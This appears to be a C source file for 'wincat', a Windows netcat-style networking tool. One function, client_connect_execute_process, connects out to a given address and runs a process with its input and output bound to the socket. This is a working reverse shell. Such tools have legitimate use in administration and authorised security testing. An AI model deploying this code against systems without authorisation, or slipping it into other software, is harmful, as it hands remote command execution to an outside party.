#include "wincat.h"

uint8_t client_connect(unsigned char *address, uint16_t port, unsigned char *null_ptr)
{
    SOCKET fd;
    struct sockaddr_in socks = {0};

    if ((fd = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET)
        return (1);
    
    socks.sin_addr.s_addr = inet_addr(address);
    socks.sin_port = htons(port);
    socks.sin_family = AF_INET;

    if (WSAConnect(fd, (struct sockaddr *)&socks, sizeof(socks), NULL, NULL, NULL, NULL) < 0)
        return (1);
    
    if (HandleConnection(fd))
        return (1);
    
    return (0); 
}

uint8_t client_connect_execute_process(unsigned char *address, uint16_t port, unsigned char *process)
{
    SOCKET fd;
    struct sockaddr_in socks = {0};
    STARTUPINFO sinfo = {0};
    PROCESS_INFORMATION pinfo = {0};

    if ((fd = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET)
        return (1);
    
    socks.sin_addr.s_addr = inet_addr(address);
    socks.sin_port = htons(port);
    socks.sin_family = AF_INET;

    if (WSAConnect(fd, (struct sockaddr *)&socks, sizeof(socks), NULL, NULL, NULL, NULL) < 0)
        return (1);
    
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    sinfo.hStdError = (SOCKET)fd;
    sinfo.hStdInput = (SOCKET)fd;
    sinfo.hStdOutput = (SOCKET)fd;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo))
        return (1);
    
    WaitForSingleObject(pinfo.hProcess, INFINITE);

    CloseHandle(pinfo.hThread);
    CloseHandle(pinfo.hProcess);
    
    return (0);
}